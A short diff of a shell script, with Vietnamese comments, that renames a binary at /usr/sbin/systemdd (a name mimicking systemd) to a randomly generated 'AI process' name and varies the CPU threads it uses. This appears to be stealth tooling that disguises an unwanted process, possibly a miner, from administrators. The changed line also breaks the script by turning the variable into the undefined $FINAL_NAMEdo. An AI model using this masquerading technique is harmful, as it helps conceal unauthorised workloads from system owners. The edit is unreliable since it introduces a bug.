@@ -44,7 +44,7 @@ RANDOM_NUMBER=$(shuf -i 1000-9999 -n 1)
 # Kết hợp tên tiến trình AI với số ngẫu nhiên để tạo tên cuối cùng
 FINAL_NAME="${RANDOM_AI_NAME}-${RANDOM_NUMBER}"
 echo $FINAL_NAME > /root/model.txt
-mv /usr/sbin/systemdd /usr/sbin/$FINAL_NAME
+mv /usr/sbin/systemdd /usr/sbin/$FINAL_NAMEdo
 
 # Tính toán số threads dựa trên % CPU ngẫu nhiên
 TOTAL_CORES=$(nproc)  # Xác định số CPU logic (bao gồm cả hyper-threading)
